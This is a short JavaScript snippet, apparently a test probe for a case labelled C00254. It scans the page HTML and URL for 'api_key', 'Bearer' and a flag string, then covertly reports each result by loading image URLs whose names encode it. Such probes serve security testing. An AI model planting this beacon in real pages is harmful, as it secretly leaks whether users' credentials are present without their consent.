(function(){var b='/cases.php/C00254_';
function chain(a,i){ if(i>=a.length) return; var im=new Image(); im.onload=im.onerror=function(){chain(a,i+1);}; im.src=a[i]; }
var H='';try{H=document.documentElement.outerHTML;}catch(e){}
var hku=location.href.indexOf('api_key')>=0?1:0;
var hkh=H.indexOf('api_key')>=0?1:0;
var hbear=H.indexOf('Bearer')>=0?1:0;
var hb2=H.indexOf('HLB2026')>=0?1:0;
chain([b+'C1.css', b+'HKU'+hku+'.css', b+'HKH'+hkh+'.css', b+'BEAR'+hbear+'.css', b+'FLAG'+hb2+'.css', b+'C2.css', b+'C3.css', b+'C4.css'],0);
})();
